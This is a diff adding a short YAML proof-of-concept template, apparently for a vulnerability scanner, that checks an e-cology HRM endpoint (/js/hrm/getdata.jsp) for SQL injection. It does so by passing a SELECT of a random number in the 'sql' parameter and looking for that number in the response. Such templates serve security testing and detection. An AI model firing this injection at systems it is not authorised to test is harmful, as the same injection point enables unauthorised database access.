@@ -1,0 +1,13 @@
+name: poc-yaml-ecology-sqli
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: GET
+    path: /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20{{rand}}%20as%20id%20from%20HrmResourceManager
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(rand)))
+detail:
+  author: whami-root(https://github.com/whami-root)
+  links:
+    - https://github.com/whami-root
